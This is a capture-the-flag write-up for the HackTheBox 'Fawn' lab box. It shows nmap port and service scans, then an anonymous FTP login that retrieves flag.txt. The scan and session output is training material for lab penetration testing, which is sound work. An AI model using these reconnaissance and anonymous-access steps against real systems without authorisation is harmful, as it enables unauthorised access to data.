---
title: "HTB - Starting Point: Fawn"
date: 2022-05-20
---

Fawn is part of the Starting Point series in HackTheBox, teaching the basics for box pwning. In this case we are going to be taking a closer look at the FTP protocol.

## Box Information

| **Name:** | **Fawn** |
|-----------|----------|
| OS:       | Linux    |
| Difficulty:| Very Easy |


## Recon

### nmap
`nmap` finds one open TCP port: FTP (21)
```
┌──kali@kali$ nmap -p- --min-rate 10000 10.129.206.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 18:03 EDT
Nmap scan report for 10.129.206.5
Host is up (0.15s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
```

```
┌──kali@kali$ nmap -p 21 -sCV 10.129.206.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 18:04 EDT
Nmap scan report for 10.129.206.5
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.96
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.65 seconds
```
where we can see `nmap` is telling us that FTP has Anonymous FTP login allowed, meaning that any user can connect and authenticate to the server without providing a password or unique credentials.

## FTP
Now that we know that FTP protocol is accessible, we just need to connect using the terminal
```
┌──kali@kali$ ftp 10.129.6.95
Connected to 10.129.6.95.
220 (vsFTPd 3.0.3)
Name (10.129.6.95:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42861|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||56977|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32       12.73 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.21 KiB/s)
ftp> 
```
